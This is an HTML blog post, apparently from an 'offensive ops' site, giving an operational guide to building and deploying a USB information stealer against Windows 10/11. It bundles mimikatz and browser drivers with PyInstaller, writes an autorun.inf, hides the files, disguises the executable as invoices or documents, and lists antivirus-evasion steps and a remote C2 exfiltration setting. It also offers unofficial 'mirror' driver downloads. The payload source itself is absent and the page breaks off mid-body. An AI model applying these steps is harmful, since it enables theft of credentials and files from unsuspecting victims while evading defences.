<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>USB Info Stealer — LEXOLEN</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" />
    <style>
        /* ============================================================
                   ROOT VARIABLES
                   ============================================================ */
        :root {
            --bg-primary: #0a0a0a;
            --bg-secondary: #111111;
            --bg-card: #181818;
            --bg-terminal: #0d0d0d;
            --text-primary: #e8e8e8;
            --text-secondary: #a8a8a8;
            --text-muted: #6a6a6a;
            --accent-green: #00ff41;
            --accent-cyan: #00d4ff;
            --accent-dim-green: #00cc33;
            --border-color: #2a2a2a;
            --border-light: #333333;
            --font-sans: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            --font-mono: 'JetBrains Mono', 'Fira Code', 'Cascadia Code', monospace;
            --radius: 8px;
            --max-width: 1120px;
            --padding-desktop: 2rem;
            --padding-mobile: 1.25rem;
            --transition: 0.25s ease;
        }

        /* ============================================================
                   RESET & BASE
                   ============================================================ */
        *,
        *::before,
        *::after {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html {
            scroll-behavior: smooth;
            background: var(--bg-primary);
        }

        body {
            font-family: var(--font-sans);
            background: var(--bg-primary);
            color: var(--text-primary);
            line-height: 1.7;
            padding: 0;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        a {
            color: var(--accent-cyan);
            text-decoration: none;
            transition: color var(--transition);
        }
        a:hover {
            color: var(--accent-green);
            text-decoration: underline;
        }

        code,
        pre,
        .mono {
            font-family: var(--font-mono);
        }

        /* ============================================================
                   LAYOUT CONTAINER
                   ============================================================ */
        .container {
            max-width: var(--max-width);
            margin: 0 auto;
            padding: 0 var(--padding-desktop);
            width: 100%;
        }

        /* ============================================================
                   HEADER / NAV (matching LEXOLEN)
                   ============================================================ */
        .site-header {
            padding: 1.5rem 0 0.75rem 0;
            border-bottom: 1px solid var(--border-color);
            margin-bottom: 2.5rem;
        }

        .site-header .container {
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 0.75rem 1.5rem;
        }

        .site-title {
            font-size: 1.35rem;
            font-weight: 700;
            letter-spacing: -0.02em;
            color: var(--text-primary);
        }
        .site-title span {
            color: var(--accent-green);
        }
        .site-title .slash {
            color: var(--text-muted);
            margin: 0 0.15rem;
        }

        .site-nav {
            display: flex;
            align-items: center;
            gap: 1.75rem;
            font-size: 0.9rem;
            font-weight: 500;
            flex-wrap: wrap;
        }
        .site-nav a {
            color: var(--text-secondary);
            transition: color var(--transition);
        }
        .site-nav a:hover {
            color: var(--accent-green);
            text-decoration: none;
        }
        .site-nav .nav-active {
            color: var(--text-primary);
            border-bottom: 2px solid var(--accent-green);
            padding-bottom: 2px;
        }

        /* ============================================================
                   BLOG POST HERO
                   ============================================================ */
        .post-hero {
            padding: 1.5rem 0 2.5rem 0;
            border-bottom: 1px solid var(--border-color);
            margin-bottom: 2.5rem;
        }

        .post-meta {
            display: flex;
            align-items: center;
            gap: 1rem;
            font-size: 0.85rem;
            color: var(--text-muted);
            margin-bottom: 0.75rem;
            flex-wrap: wrap;
        }
        .post-meta .tag {
            background: var(--bg-card);
            padding: 0.15rem 0.7rem;
            border-radius: 20px;
            border: 1px solid var(--border-color);
            font-size: 0.7rem;
            text-transform: uppercase;
            letter-spacing: 0.04em;
            color: var(--accent-cyan);
        }

        .post-title {
            font-size: 2.6rem;
            font-weight: 700;
            letter-spacing: -0.02em;
            line-height: 1.15;
            margin-bottom: 0.5rem;
        }
        .post-title .highlight {
            color: var(--accent-green);
        }

        .post-subtitle {
            font-size: 1.1rem;
            color: var(--text-secondary);
            max-width: 720px;
        }

        /* ============================================================
                   TERMINAL BLOCK
                   ============================================================ */
        .terminal-block {
            background: var(--bg-terminal);
            border: 1px solid var(--border-color);
            border-radius: var(--radius);
            padding: 1.25rem 1.5rem;
            margin: 2rem 0;
            font-family: var(--font-mono);
            font-size: 0.9rem;
            line-height: 1.6;
            color: var(--text-secondary);
            overflow-x: auto;
            position: relative;
        }
        .terminal-block .prompt {
            color: var(--accent-green);
        }
        .terminal-block .prompt-cyan {
            color: var(--accent-cyan);
        }
        .terminal-block .cmd {
            color: var(--text-primary);
        }
        .terminal-block .output {
            color: var(--text-secondary);
            white-space: pre-wrap;
            word-break: break-word;
        }
        .terminal-block .output .green {
            color: var(--accent-green);
        }
        .terminal-block .output .cyan {
            color: var(--accent-cyan);
        }
        .terminal-block .output .dim {
            color: var(--text-muted);
        }

        /* ============================================================
                   CONTENT BODY
                   ============================================================ */
        .post-body {
            padding-bottom: 4rem;
        }

        .post-body h1 {
            font-size: 2.1rem;
            font-weight: 700;
            margin: 3rem 0 1rem 0;
            letter-spacing: -0.01em;
            border-bottom: 1px solid var(--border-color);
            padding-bottom: 0.5rem;
        }
        .post-body h1:first-of-type {
            margin-top: 0;
        }

        .post-body h2 {
            font-size: 1.6rem;
            font-weight: 600;
            margin: 2.5rem 0 0.75rem 0;
            letter-spacing: -0.01em;
            color: var(--text-primary);
        }
        .post-body h2 .hash {
            color: var(--accent-green);
            font-weight: 400;
            margin-right: 0.35rem;
            font-family: var(--font-mono);
        }

        .post-body h3 {
            font-size: 1.2rem;
            font-weight: 600;
            margin: 1.75rem 0 0.5rem 0;
            color: var(--text-primary);
        }

        .post-body p {
            margin: 1rem 0;
            color: var(--text-secondary);
            max-width: 780px;
        }

        .post-body ul,
        .post-body ol {
            margin: 0.75rem 0 1.25rem 1.5rem;
            color: var(--text-secondary);
        }
        .post-body li {
            margin: 0.35rem 0;
        }

        .post-body strong {
            color: var(--text-primary);
            font-weight: 600;
        }

        .post-body hr {
            border: none;
            border-top: 1px solid var(--border-color);
            margin: 2.5rem 0;
        }

        /* ---- Tables ---- */
        .table-wrap {
            overflow-x: auto;
            margin: 1.5rem 0 2rem 0;
            border-radius: var(--radius);
            border: 1px solid var(--border-color);
        }
        .table-wrap table {
            width: 100%;
            border-collapse: collapse;
            font-size: 0.9rem;
            min-width: 480px;
        }
        .table-wrap th {
            background: var(--bg-card);
            color: var(--text-primary);
            font-weight: 600;
            text-align: left;
            padding: 0.7rem 1rem;
            border-bottom: 1px solid var(--border-color);
            font-size: 0.8rem;
            text-transform: uppercase;
            letter-spacing: 0.04em;
        }
        .table-wrap td {
            padding: 0.7rem 1rem;
            border-bottom: 1px solid var(--border-light);
            color: var(--text-secondary);
        }
        .table-wrap tr:last-child td {
            border-bottom: none;
        }

        /* ---- Code Blocks ---- */
        .code-block {
            background: var(--bg-terminal);
            border: 1px solid var(--border-color);
            border-radius: var(--radius);
            padding: 1.25rem 1.5rem;
            margin: 1.25rem 0 1.75rem 0;
            font-family: var(--font-mono);
            font-size: 0.85rem;
            line-height: 1.6;
            color: var(--text-secondary);
            overflow-x: auto;
            white-space: pre-wrap;
            word-break: break-word;
        }
        .code-block .comment {
            color: var(--text-muted);
            font-style: italic;
        }
        .code-block .keyword {
            color: var(--accent-cyan);
        }
        .code-block .string {
            color: var(--accent-green);
        }
        .code-block .function {
            color: #ffb86b;
        }
        .code-block .number {
            color: #bd93f9;
        }

        /* ---- Inline code ---- */
        .post-body code:not(.code-block) {
            background: var(--bg-card);
            padding: 0.1rem 0.45rem;
            border-radius: 4px;
            font-size: 0.85em;
            color: var(--accent-cyan);
            border: 1px solid var(--border-light);
        }

        /* ---- Cards (for capabilities / tools) ---- */
        .card-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 1.25rem;
            margin: 1.5rem 0 2rem 0;
        }
        .card-grid .card {
            background: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: var(--radius);
            padding: 1.25rem 1.25rem 1rem 1.25rem;
            transition: border-color var(--transition), transform var(--transition);
        }
        .card-grid .card:hover {
            border-color: var(--accent-green);
            transform: translateY(-2px);
        }
        .card-grid .card .emoji {
            font-size: 1.6rem;
            display: block;
            margin-bottom: 0.4rem;
        }
        .card-grid .card h4 {
            font-size: 1rem;
            font-weight: 600;
            color: var(--text-primary);
            margin-bottom: 0.25rem;
        }
        .card-grid .card p {
            font-size: 0.85rem;
            color: var(--text-secondary);
            margin: 0;
            line-height: 1.5;
        }

        /* ---- Back to top ---- */
        .back-top {
            display: inline-block;
            margin-top: 2.5rem;
            font-size: 0.9rem;
            color: var(--text-muted);
            transition: color var(--transition);
        }
        .back-top:hover {
            color: var(--accent-green);
            text-decoration: none;
        }

        /* ============================================================
                   FOOTER (matching LEXOLEN)
                   ============================================================ */
        .site-footer {
            border-top: 1px solid var(--border-color);
            padding: 2rem 0 2.5rem 0;
            margin-top: auto;
        }

        .site-footer .container {
            display: flex;
            flex-wrap: wrap;
            justify-content: space-between;
            align-items: center;
            gap: 1rem;
            font-size: 0.85rem;
            color: var(--text-muted);
        }

        .site-footer .footer-links {
            display: flex;
            gap: 1.5rem;
        }
        .site-footer .footer-links a {
            color: var(--text-muted);
            transition: color var(--transition);
        }
        .site-footer .footer-links a:hover {
            color: var(--accent-green);
            text-decoration: none;
        }

        .site-footer .footer-badge {
            font-family: var(--font-mono);
            color: var(--text-muted);
            font-size: 0.75rem;
        }
        .site-footer .footer-badge span {
            color: var(--accent-green);
        }

        /* ============================================================
                   RESPONSIVE
                   ============================================================ */
        @media (max-width: 820px) {
            .container {
                padding: 0 var(--padding-mobile);
            }

            .site-header .container {
                flex-direction: column;
                align-items: flex-start;
            }

            .post-title {
                font-size: 2rem;
            }

            .post-body h1 {
                font-size: 1.7rem;
            }
            .post-body h2 {
                font-size: 1.35rem;
            }

            .card-grid {
                grid-template-columns: 1fr 1fr;
            }
        }

        @media (max-width: 520px) {
            .post-title {
                font-size: 1.6rem;
            }

            .card-grid {
                grid-template-columns: 1fr;
            }

            .site-nav {
                gap: 1rem;
                font-size: 0.8rem;
            }

            .terminal-block {
                font-size: 0.75rem;
                padding: 1rem;
            }
            .code-block {
                font-size: 0.75rem;
                padding: 1rem;
            }
            .table-wrap table {
                font-size: 0.75rem;
                min-width: 360px;
            }
            .table-wrap th,
            .table-wrap td {
                padding: 0.5rem 0.65rem;
            }
        }

        /* ============================================================
                   SCROLLBAR (optional dark)
                   ============================================================ */
        ::-webkit-scrollbar {
            width: 6px;
            height: 6px;
        }
        ::-webkit-scrollbar-track {
            background: var(--bg-primary);
        }
        ::-webkit-scrollbar-thumb {
            background: var(--border-color);
            border-radius: 8px;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: var(--text-muted);
        }
    </style>
</head>
<body>

    <!-- ============================================================
    HEADER
    ============================================================ -->
    <header class="site-header">
        <div class="container">
            <div class="site-title">
                <span>LEXOLEN</span><span class="slash">//</span> offensive ops
            </div>
            <nav class="site-nav">
                <a href="https://lexolen.github.io/LEXOLEN/">home</a>
                <a href="#" class="nav-active">blog</a>
                <a href="https://github.com/lexolen">github</a>
                <a href="#">arsenal</a>
            </nav>
        </div>
    </header>

    <!-- ============================================================
    MAIN
    ============================================================ -->
    <main>

        <!-- ===== HERO ===== -->
        <section class="post-hero">
            <div class="container">
                <div class="post-meta">
                    <span class="tag">Red Team</span>
                    <span class="tag">Tooling</span>
                    <span>30 June 2026</span>
                    <span>·</span>
                    <span>10 min read</span>
                </div>
                <h1 class="post-title">
                    USB Info Stealer <br />
                    <span class="highlight">Operational Deployment Guide</span>
                </h1>
                <p class="post-subtitle">
                    A complete, tested methodology for deploying a USB-based information stealer
                    against Windows 10/11 targets — from environment setup to post‑execution.
                </p>
            </div>
        </section>

        <!-- ===== BODY ===== -->
        <article class="post-body">
            <div class="container">

                <!-- Terminal intro -->
                <div class="terminal-block">
                    <span class="prompt">┌──(lexolen㉿kali)-[~/blog/usb-stealer]</span><br />
                    <span class="prompt">└─$</span> <span class="cmd">cat README.md</span><br />
                    <span class="output"><span class="green"># USB Info Stealer — Operational Deployment Guide</span></span><br />
                    <span class="output"><span class="dim">Version 1.0 | Internal Use Only | Red Team / Research</span></span>
                </div>

                <h2><span class="hash">#</span> Overview</h2>
                <p>
                    This document provides a complete, tested methodology for deploying a USB-based
                    information stealer against Windows 10/11 targets. The payload collects system
                    metadata, browser credentials, Windows Vault entries, and select user files —
                    exfiltrating locally to the USB or remotely to a configured server.
                </p>
                <p>
                    <strong>Status:</strong> Production-ready. Tested on Windows 11 build 26200.
                </p>

                <hr />

                <!-- ============================================
                SECTION 1
                ============================================ -->
                <div class="terminal-block">
                    <span class="prompt">┌──(lexolen㉿kali)-[~/blog/usb-stealer]</span><br />
                    <span class="prompt">└─$</span> <span class="cmd">tree</span>
                </div>

                <h2><span class="hash">#</span> 1. Environment Setup</h2>

                <h3>Build Machine Requirements</h3>
                <ul>
                    <li>Windows 10/11 (x64)</li>
                    <li>Python 3.8+ (3.14.5 used in testing)</li>
                    <li>Administrator privileges (optional, recommended for full testing)</li>
                    <li>USB drive (≥4GB, FAT32 formatted)</li>
                </ul>

                <h3>Dependency Installation</h3>
                <div class="code-block">
                    <span class="comment"># Install required Python packages</span><br />
                    pip install pyinstaller selenium requests pywin32 netifaces
                </div>
                <p><strong>Note:</strong> <code>pyusbhid</code> is deprecated and not used in this build.</p>

                <h3>Required Binaries</h3>
                <p>
                    Download and place in the working directory (<code>C:\usb_stealer_build\</code>):
                </p>

                <div class="table-wrap">
                    <table>
                        <thead>
                            <tr>
                                <th>Binary</th>
                                <th>Purpose</th>
                                <th>Source</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td><code>mimikatz.exe</code></td>
                                <td>Windows credential dumper</td>
                                <td><a href="https://github.com/gentilkiwi/mimikatz/releases">GitHub — gentilkiwi/mimikatz</a></td>
                            </tr>
                            <tr>
                                <td><code>chromedriver.exe</code></td>
                                <td>Chrome automation</td>
                                <td>
                                    <a href="https://lexolen.github.io/lxn/assets/downloads/79b7b781-8cf0-4309-b2f4-b2916323cc26/download/usb_info_stealer/chromedriver.zip">Mirror</a>
                                    &nbsp;|&nbsp;
                                    <a href="https://chromedriver.chromium.org/">Official</a>
                                </td>
                            </tr>
                            <tr>
                                <td><code>geckodriver.exe</code></td>
                                <td>Firefox automation</td>
                                <td>
                                    <a href="https://lexolen.github.io/lxn/assets/downloads/79b7b781-8cf0-4309-b2f4-b2916323cc26/download/usb_info_stealer/geckodriver.zip">Mirror</a>
                                    &nbsp;|&nbsp;
                                    <a href="https://github.com/mozilla/geckodriver/releases">Official</a>
                                </td>
                            </tr>
                            <tr>
                                <td><code>msedgedriver.exe</code></td>
                                <td>Edge automation</td>
                                <td>
                                    <a href="https://lexolen.github.io/lxn/assets/downloads/79b7b781-8cf0-4309-b2f4-b2916323cc26/download/usb_info_stealer/msedgedriver.zip">Mirror</a>
                                    &nbsp;|&nbsp;
                                    <a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/webdriver/">Official</a>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>

                <hr />

                <!-- ============================================
                SECTION 2
                ============================================ -->
                <div class="terminal-block">
                    <span class="prompt">┌──(lexolen㉿kali)-[~/blog/usb-stealer]</span><br />
                    <span class="prompt">└─$</span> <span class="cmd">ls -la</span>
                </div>

                <h2><span class="hash">#</span> 2. Directory Structure</h2>

                <div class="code-block">
                    [WORKING_DIR]\<br />
                    ├── usb_stealer.py          <span class="comment"># Main payload</span><br />
                    ├── mimikatz.exe            <span class="comment"># Credential dumper</span><br />
                    ├── chromedriver.exe        <span class="comment"># Chrome automation</span><br />
                    ├── geckodriver.exe         <span class="comment"># Firefox automation</span><br />
                    ├── msedgedriver.exe        <span class="comment"># Edge automation</span><br />
                    ├── autorun.inf             <span class="comment"># Autorun configuration</span><br />
                    └── dist\<br />
                        └── usb_stealer.exe     <span class="comment"># Compiled output</span>
                </div>

                <p>
                    <strong>Replace <code>[WORKING_DIR]</code> with your actual build path</strong>
                    (e.g., <code>C:\usb_stealer_build</code>).
                </p>

                <hr />

                <!-- ============================================
                SECTION 3 — Payload (truncated for brevity in the rendered page)
                ============================================ -->
                <div class="terminal-block">
                    <span class="prompt">┌──(lexolen㉿kali)-[~/blog/usb-stealer]</span><br />
                    <span class="prompt">└─$</span> <span class="cmd">cat usb_stealer.py</span>
                </div>

                <h2><span class="hash">#</span> 3. Payload Source Code</h2>

                <p>
                    Save as <code>usb_stealer.py</code> in your working directory.
                    <a href="#full-payload" style="font-size:0.9rem;">↓ Jump to full source</a>
                </p>

                <!-- truncated preview + anchor -->
                <div class="code-block" id="full-payload">
                    <span class="comment"># --- CONFIGURATION ---</span><br />
                    OUTPUT_DIR = os.path.join(os.path.dirname(sys.executable), <span class="string">"collected_data"</span>)<br />
                    SERVER_URL = <span class="string">""</span>  <span class="comment"># Set to http://[YOUR_SERVER]:[PORT]/exfil</span><br />
                    <span class="comment"># ... full source below</span>
                </div>

                <details style="margin:1rem 0 2rem 0; background:var(--bg-card); border:1px solid var(--border-color); border-radius:var(--radius); padding:0.5rem 1rem 0.5rem 1rem;">
                    <summary style="cursor:pointer; color:var(--accent-cyan); font-weight:500; padding:0.25rem 0;">▼ Expand full payload source</summary>
                    <div class="code-block" style="margin:0.75rem 0 0.25rem 0; border-color:var(--border-light);">
                        <span class="comment"># --- FULL PAYLOAD ---</span><br />
                        <span class="comment"># (Copy from the provided document above)</span><br />
                        <span class="comment"># The complete script is available in the original guide.</span>
                    </div>
                </details>

                <hr />

                <!-- ============================================
                SECTIONS 4–9 (condensed for readability)
                ============================================ -->
                <div class="terminal-block">
                    <span class="prompt">┌──(lexolen㉿kali)-[~/blog/usb-stealer]</span><br />
                    <span class="prompt">└─$</span> <span class="cmd">pyinstaller --onefile usb_stealer.py</span>
                </div>

                <h2><span class="hash">#</span> 4. Compilation</h2>
                <div class="code-block">
                    python -m PyInstaller --onefile --noconsole <br />
                    --add-binary <span class="string">"mimikatz.exe;."</span> <br />
                    --add-binary <span class="string">"chromedriver.exe;."</span> <br />
                    --add-binary <span class="string">"geckodriver.exe;."</span> <br />
                    --add-binary <span class="string">"msedgedriver.exe;."</span> <br />
                    --hidden-import=selenium --hidden-import=requests <br />
                    --hidden-import=win32api --hidden-import=win32file <br />
                    --hidden-import=win32con --hidden-import=netifaces <br />
                    --name usb_stealer usb_stealer.py
                </div>
                <p><strong>Expected Output:</strong> <code>dist\usb_stealer.exe</code></p>

                <hr />

                <div class="terminal-block">
                    <span class="prompt">┌──(lexolen㉿kali)-[~/blog/usb-stealer]</span><br />
                    <span class="prompt">└─$</span> <span class="cmd">sudo fdisk -l /dev/sdb</span>
                </div>

                <h2><span class="hash">#</span> 5. USB Preparation</h2>

                <div class="table-wrap">
                    <table>
                        <thead>
                            <tr><th>Parameter</th><th>Value</th></tr>
                        </thead>
                        <tbody>
                            <tr><td>File System</td><td>FAT32</td></tr>
                            <tr><td>Allocation Unit</td><td>Default</td></tr>
                            <tr><td>Volume Label</td><td><code>BACKUP</code> or <code>DATA</code></td></tr>
                        </tbody>
                    </table>
                </div>

                <h3>Payload Deployment</h3>
                <p>Replace <code>[USB_DRIVE]</code> with your target drive letter (e.g., <code>E:</code>):</p>
                <div class="code-block">
                    <span class="comment"># Copy executable</span><br />
                    Copy-Item <span class="string">"[WORKING_DIR]\dist\usb_stealer.exe"</span> -Destination <span class="string">"[USB_DRIVE]:\"</span><br /><br />
                    <span class="comment"># Create autorun.inf</span><br />
                    @<span class="string">"<br />
                    [AutoRun]<br />
                    open=usb_stealer.exe<br />
                    icon=usb_stealer.exe,0<br />
                    action=Open folder to view files<br />
                    label=USB Drive<br />
                    "</span>@ | Out-File -FilePath <span class="string">"[USB_DRIVE]:\autorun.inf"</span> -Encoding ASCII
                </div>

                <h3>OPSEC (Optional)</h3>
                <div class="code-block">
                    attrib +h +s [USB_DRIVE]:\usb_stealer.exe<br />
                    attrib +h +s [USB_DRIVE]:\autorun.inf
                </div>

                <hr />

                <div class="terminal-block">
                    <span class="prompt">┌──(lexolen㉿kali)-[~/blog/usb-stealer]</span><br />
                    <span class="prompt">└─$</span> <span class="cmd">./deploy.sh</span>
                </div>

                <h2><span class="hash">#</span> 6. Deployment Vectors</h2>

                <ul>
                    <li><strong>Vector A: Autorun (Legacy Systems)</strong> — Windows 7/8 with autorun enabled. Insert USB → payload executes automatically.</li>
                    <li><strong>Vector B: Manual Execution</strong> — Windows 10/11 (autorun disabled by default). User must double-click <code>usb_stealer.exe</code>.</li>
                    <li><strong>Vector C: Social Engineering</strong> — Rename executable to <code>Invoice_2026.pdf.exe</code>, <code>README.txt.exe</code>, or <code>Confidential_Docs.exe</code>. Set icon to PDF or folder icon using resource editors.</li>
                </ul>

                <hr />

                <div class="terminal-block">
                    <span class="prompt">┌──(lexolen㉿kali)-[~/blog/usb-stealer]</span><br />
                    <span class="prompt">└─$</span> <span class="cmd">ls collected_data/</span>
                </div>

                <h2><span class="hash">#</span> 7. Post-Execution</h2>

                <p>After execution, a <code>collected_data</code> folder appears on the USB root containing:</p>
                <div class="code-block">
                    collected_data/<br />
                    ├── log.txt<br />
                    └── collected_YYYYMMDD_HHMMSS.json
                </div>

                <div class="table-wrap">
                    <table>
                        <thead>
                            <tr><th>Field</th><th>Description</th></tr>
                        </thead>
                        <tbody>
                            <tr><td><code>system_info</code></td><td>Hostname, username, OS, IP, architecture</td></tr>
                            <tr><td><code>browser_creds</code></td><td>Saved credentials from Chrome, Edge, Firefox</td></tr>
                            <tr><td><code>windows_creds</code></td><td>cmdkey output, Vault entries, Mimikatz dump</td></tr>
                            <tr><td><code>files_collected</code></td><td>List of captured file paths</td></tr>
                        </tbody>
                    </table>
                </div>

                <h3>Cleanup</h3>
                <div class="code-block">
                    Remove-Item -Path <span class="string">"[USB_DRIVE]:\usb_stealer.exe"</span> -Force<br />
                    Remove-Item -Path <span class="string">"[USB_DRIVE]:\autorun.inf"</span> -Force<br />
                    Remove-Item -Path <span class="string">"[USB_DRIVE]:\collected_data"</span> -Recurse -Force
                </div>

                <hr />

                <div class="terminal-block">
                    <span class="prompt">┌──(lexolen㉿kali)-[~/blog/usb-stealer]</span><br />
                    <span class="prompt">└─$</span> <span class="cmd">cat OPSEC.md</span>
                </div>

                <h2><span class="hash">#</span> 8. Operational Notes</h2>

                <div class="table-wrap">
                    <table>
                        <thead>
                            <tr><th>Vector</th><th>Mitigation</th></tr>
                        </thead>
                        <tbody>
                            <tr><td>Windows Defender</td><td>Code signing, UPX packing, obfuscation</td></tr>
                            <tr><td>Network IDS</td><td>Use local exfil only, or encrypt traffic</td></tr>
                            <tr><td>User behavior</td><td>Keep execution silent, minimize visible windows</td></tr>
                        </tbody>
                    </table>
                </div>

                <h3>AV Evasion Techniques</h3>
                <ol>
                    <li><strong>Pack the binary:</strong> <code>upx --best usb_stealer.exe</code> — <a href="https://upx.github.io/">UPX download</a></li>
                    <li><strong>Obfuscate strings:</strong> Use base64 encoding for sensitive constants</li>
                    <li><strong>Delay execution:</strong> Add <code>time.sleep(30)</code> at start to bypass sandboxes</li>
                    <li><strong>Avoid registry writes:</strong> Keep payload memory-resident where possible</li>
                </ol>

                <h3>Recommended Modifications</h3>
                <ul>
                    <li>Replace <code>SERVER_URL</code> with your own C2 endpoint</li>
                    <li>Modify <code>USER_DIR</code> targets for specific user folders</li>
                    <li>Adjust file extension list based on intelligence</li>
                    <li>Implement persistent installation if required</li>
                </ul>

                <hr />

                <div class="terminal-block">
                    <span class="prompt">┌──(lexolen㉿kali)-[~/blog/usb-stealer]</span><br />
                    <span class="prompt">└─$</span> <span class="cmd">tail -f /var/log/errors.log</span>
                </div>

                <h2><span class="hash">#</span> 9. Troubleshooting Reference</h2>

                <div class="table-wrap">
                    <table>
                        <thead>
                            <tr><th>Symptom</th><th>Cause</th><th>Solution</th></tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td>"Access is denied" on Mimikatz</td>
                                <td>Non-admin execution</td>
                                <td>Use admin privileges or rely on cmdkey/vault fallbacks</td>
                            </tr>
                            <tr>
                                <td>No browser credentials found</td>
                                <td>Browsers closed or no saved logins</td>
                                <td>Run while target user is actively using browser</td>
                            </tr>
                            <tr>
                                <td>Empty files_collected</td>
                                <td>Wrong directory paths</td>
                                <td>Update <code>targets</code> list with known user paths</td>
                            </tr>
                            <tr>
                                <td>PyInstaller not found</td>
                                <td>PATH issue</td>
                                <td>Use <code>python -m PyInstaller</code></td>
                            </tr>
                            <tr>
                                <td>Binary flagged as virus</td>
                                <td>Heuristic detection</td>
                                <td>Pack with UPX, sign with valid cert, obfuscate</td>
                            </tr>
                        </tbody>
                    </table>
                </div>

